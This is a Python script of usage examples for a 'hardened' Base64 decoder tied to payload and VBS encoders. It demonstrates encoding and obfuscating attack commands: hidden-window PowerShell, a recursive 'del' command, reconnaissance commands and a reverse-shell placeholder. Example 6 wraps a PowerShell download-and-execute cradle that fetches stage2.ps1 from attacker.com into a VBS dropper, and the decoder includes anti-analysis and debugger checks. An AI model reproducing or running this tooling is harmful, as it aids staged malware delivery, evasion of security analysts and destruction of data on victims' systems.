#!/usr/bin/env python3
"""
Integration examples showing hardened decoder usage with existing encoder/payload systems
Demonstrates real-world scenarios and best practices
"""

import base64
from base64_encoder import Base64Encoder, Base64OperationsPair
from base64_hardened_decoder import (
    HardenedBase64Decoder,
    hardened_decode,
    create_protected_decoder,
)


# ============================================================================
# Example 1: Basic Encoder-Decoder Integration
# ============================================================================

def example_basic_integration():
    """Simple encode-decode pipeline with hardening"""
    print("=" * 70)
    print("Example 1: Basic Encoder-Decoder Integration")
    print("=" * 70)

    encoder = Base64Encoder()
    decoder = HardenedBase64Decoder(strict_mode=False)

    # Payload to encode
    payload = "powershell.exe -NoProfile -WindowStyle Hidden -Command 'Write-Host Executed'"

    # Encode using standard encoder
    encoded = encoder.encode_to_base64(payload)
    print(f"\nOriginal Payload:\n  {payload}\n")
    print(f"Encoded (Base64):\n  {encoded}\n")

    # Decode using hardened decoder
    decoded = decoder.decode(encoded)
    print(f"Decoded (Hardened):\n  {decoded}\n")

    # Verify correctness
    assert decoded == payload, "Payload mismatch!"
    print("Status: Payload integrity verified ✓")


# ============================================================================
# Example 2: Multiple Payloads with Batch Processing
# ============================================================================

def example_batch_processing():
    """Batch encode multiple payloads and decode with hardening"""
    print("\n" + "=" * 70)
    print("Example 2: Batch Processing Multiple Payloads")
    print("=" * 70)

    encoder = Base64Encoder()
    decoder = HardenedBase64Decoder()

    # List of payloads
    payloads = [
        "cmd /c ipconfig /all",
        "powershell Get-Process",
        "bash -c 'whoami'",
    ]

    print(f"\nEncoding {len(payloads)} payloads...\n")

    # Encode all
    encoded_payloads = encoder.batch_encode_multiple(payloads)

    for payload, encoded in encoded_payloads.items():
        print(f"Payload:  {payload}")
        print(f"Encoded:  {encoded[:50]}..." if len(encoded) > 50 else f"Encoded:  {encoded}")
        print()

    # Batch decode with hardening
    print("Batch decoding with hardened decoder...\n")
    encoded_list = list(encoded_payloads.values())
    decoded_list = decoder.batch_decode(encoded_list)

    # Verify all decoded correctly
    print("Verification:")
    for original, decoded in zip(payloads, decoded_list):
        status = "✓" if original == decoded else "✗"
        print(f"  {status} {original}")


# ============================================================================
# Example 3: Integrity Protection with Tampering Detection
# ============================================================================

def example_integrity_protection():
    """Demonstrate integrity verification against tampering"""
    print("\n" + "=" * 70)
    print("Example 3: Integrity Protection & Tampering Detection")
    print("=" * 70)

    encoder = Base64Encoder()
    decoder = HardenedBase64Decoder()

    payload = "cmd /c del /s C:\\Windows\\temp\\*"
    encoded = encoder.encode_to_base64(payload)

    # Calculate integrity hash
    integrity_hash = decoder.anti_tampering.calculate_integrity_hash(
        encoded.encode()
    )

    print(f"\nOriginal Payload:\n  {payload}\n")
    print(f"Encoded:\n  {encoded}\n")
    print(f"Integrity Hash (SHA-256):\n  {integrity_hash}\n")

    # Scenario 1: Valid decoding with correct hash
    print("Scenario 1: Valid decode with correct integrity hash")
    try:
        decoded = decoder.decode(encoded, integrity_check=integrity_hash)
        print(f"  Result: Successfully decoded ✓")
        print(f"  Payload: {decoded}")
    except ValueError as e:
        print(f"  Result: Failed - {e}")

    # Scenario 2: Tampering attempt (wrong hash)
    print("\nScenario 2: Tampering attempt (wrong hash)")
    wrong_hash = "0" * 64  # Invalid hash
    try:
        decoded = decoder.decode(encoded, integrity_check=wrong_hash)
        print(f"  Result: Decoded (should not happen)")
    except ValueError as e:
        print(f"  Result: Tampering detected and blocked ✓")
        print(f"  Error: {e}")

    # Scenario 3: Data corruption
    print("\nScenario 3: Data corruption attempt")
    corrupted = encoded[:-10] + "XXXXXXXXXX"  # Corrupt last 10 chars
    try:
        decoded = decoder.decode(corrupted)
        print(f"  Result: Decoded (may fail verification)")
    except ValueError as e:
        print(f"  Result: Corruption detected ✓")
        print(f"  Error: {e}")


# ============================================================================
# Example 4: Security Status Monitoring
# ============================================================================

def example_security_monitoring():
    """Monitor security threats and suspicious activity"""
    print("\n" + "=" * 70)
    print("Example 4: Security Status & Threat Monitoring")
    print("=" * 70)

    decoder = HardenedBase64Decoder(enable_anti_analysis=True, strict_mode=False)

    # Simulate multiple operations
    test_payloads = [
        "powershell -c 'Get-NetIPConfiguration'",
        "cmd /c systeminfo",
        "bash -c 'id && whoami'",
    ]

    print("\nPerforming security-sensitive decoding operations...\n")

    for i, payload in enumerate(test_payloads, 1):
        encoded = base64.b64encode(payload.encode()).decode()
        decoded = decoder.decode(encoded)
        print(f"  Operation {i}: Decoded {len(decoded)} bytes")

    # Get security status
    print("\nSecurity Status Report:")
    status = decoder.get_security_status()

    print(f"\n  Anti-analysis enabled: {status['anti_analysis_enabled']}")
    print(f"  Strict mode: {status['strict_mode']}")
    print(f"  Total operations: {status['total_calls']}")
    print(f"  Suspicious activities detected: {status['suspicious_activity_count']}")

    if status['current_threats']:
        print(f"\n  Detected Threats:")
        for threat in status['current_threats']:
            print(f"    - {threat}")
    else:
        print(f"\n  No threats detected ✓")

    print(f"\n  Execution Context:")
    context = status['execution_context']
    print(f"    - Interactive: {context['is_interactive']}")
    print(f"    - Has Arguments: {context['has_argv']}")
    print(f"    - Python Optimization: {context['python_optimization']}")
    print(f"    - Debugger Active: {context['has_debugger']}")


# ============================================================================
# Example 5: Convenient Single-Line Usage
# ============================================================================

def example_convenience_functions():
    """Demonstrate convenience functions for quick integration"""
    print("\n" + "=" * 70)
    print("Example 5: Convenience Functions for Quick Integration")
    print("=" * 70)

    # Quick encode-decode pattern
    payload = "meterpreter reverse shell payload"
    encoded = base64.b64encode(payload.encode()).decode()

    print(f"\nPayload: {payload}")
    print(f"Encoded: {encoded}\n")

    # One-liner hardened decode
    print("Using hardened_decode() convenience function:")
    decoded = hardened_decode(encoded)
    print(f"Decoded: {decoded} ✓\n")

    # Factory function for custom decoder
    print("Creating custom protected decoder with strict mode:")
    strict_decoder = create_protected_decoder(strict_mode=False)  # False for demo
    decoded2 = strict_decoder.decode(encoded)
    print(f"Result: {decoded2} ✓")


# ============================================================================
# Example 6: Real-World VBS Payload Hardening
# ============================================================================

def example_vbs_payload_hardening():
    """Hardening Base64-decoded content embedded in VBS payloads"""
    print("\n" + "=" * 70)
    print("Example 6: Real-World VBS Payload Hardening")
    print("=" * 70)

    from vbs_encoder import VBSEncoder

    # PowerShell command to execute
    ps_command = "powershell -NoProfile -Command '$client = New-Object Net.WebClient; IEX($client.DownloadString(\"http://attacker.com/stage2.ps1\"))'"

    # Encode with VBS
    vbs_encoder = VBSEncoder()
    vbs_code = vbs_encoder.create_base64_decoder_vbs(ps_command)

    print("\nGenerated VBS Payload (excerpt):")
    print("-" * 70)
    vbs_lines = vbs_code.split('\n')
    for line in vbs_lines[:10]:  # Show first 10 lines
        print(line)
    if len(vbs_lines) > 10:
        print("  ...")
    print("-" * 70)

    # Hardened decoding of embedded payload
    print("\nHardened Decoding of Embedded Payload:")
    decoder = HardenedBase64Decoder()

    # Extract Base64 from the command
    base64_payload = base64.b64encode(ps_command.encode()).decode()
    print(f"Embedded Base64: {base64_payload[:60]}...\n")

    # Decode with hardening
    decoded_payload = decoder.decode(base64_payload)
    print(f"Decoded Safely: {decoded_payload[:80]}...\n")
    print(f"Status: VBS payload successfully hardened ✓")


# ============================================================================
# Example 7: Error Handling and Edge Cases
# ============================================================================

def example_error_handling():
    """Demonstrate robust error handling"""
    print("\n" + "=" * 70)
    print("Example 7: Error Handling & Edge Cases")
    print("=" * 70)

    decoder = HardenedBase64Decoder(strict_mode=False)

    test_cases = [
        ("Valid Base64", base64.b64encode(b"test").decode(), True),
        ("Empty String", "", False),
        ("Invalid Base64", "!@#$%^&*()", False),
        ("Whitespace", "  SGVsbG8=  ", True),
    ]

    print("\nTesting edge cases:\n")

    for name, encoded, should_succeed in test_cases:
        try:
            decoded = decoder.decode(encoded)
            status = "✓" if should_succeed else "✗ (unexpected success)"
            print(f"  {name}: {status}")
            if decoded:
                print(f"    Decoded: {decoded}")
        except ValueError as e:
            status = "✓" if not should_succeed else "✗ (unexpected failure)"
            print(f"  {name}: {status}")
            print(f"    Error: {str(e)[:50]}...")


# ============================================================================
# Example 8: Performance Characteristics
# ============================================================================

def example_performance_analysis():
    """Analyze performance characteristics"""
    print("\n" + "=" * 70)
    print("Example 8: Performance Analysis")
    print("=" * 70)

    import time

    decoder = HardenedBase64Decoder()

    # Test single decode
    payload = "test payload " * 10
    encoded = base64.b64encode(payload.encode()).decode()

    print("\nSingle Operation Performance:")
    start = time.time()
    for _ in range(100):
        decoder.decode(encoded)
    elapsed = time.time() - start

    print(f"  100 decoding operations: {elapsed:.3f} seconds")
    print(f"  Average per operation: {(elapsed / 100) * 1000:.2f} ms")

    # Test batch processing
    payloads = [f"payload_{i}" for i in range(100)]
    encoded_list = [base64.b64encode(p.encode()).decode() for p in payloads]

    print("\nBatch Processing Performance:")
    start = time.time()
    decoder.batch_decode(encoded_list)
    elapsed = time.time() - start

    print(f"  100 payloads batch decode: {elapsed:.3f} seconds")
    print(f"  Average per payload: {(elapsed / 100) * 1000:.2f} ms")

    # Memory usage estimate
    print("\nMemory Characteristics:")
    import sys
    decoder_size = sys.getsizeof(decoder)
    print(f"  Decoder instance size: ~{decoder_size / 1024:.1f} KB")
    print(f"  Per-operation overhead: ~{sys.getsizeof(encoded) / 1024:.2f} KB")


# ============================================================================
# Main Execution
# ============================================================================

def main():
    """Run all examples"""
    print("\n")
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 68 + "║")
    print("║" + "  HARDENED BASE64 DECODER - Integration Examples".center(68) + "║")
    print("║" + " " * 68 + "║")
    print("╚" + "═" * 68 + "╝")

    examples = [
        ("Basic Integration", example_basic_integration),
        ("Batch Processing", example_batch_processing),
        ("Integrity Protection", example_integrity_protection),
        ("Security Monitoring", example_security_monitoring),
        ("Convenience Functions", example_convenience_functions),
        ("VBS Payload Hardening", example_vbs_payload_hardening),
        ("Error Handling", example_error_handling),
        ("Performance Analysis", example_performance_analysis),
    ]

    for name, func in examples:
        try:
            func()
        except Exception as e:
            print(f"\n[ERROR in {name}]: {e}")
            import traceback
            traceback.print_exc()

    print("\n" + "=" * 70)
    print("All examples completed!")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    main()
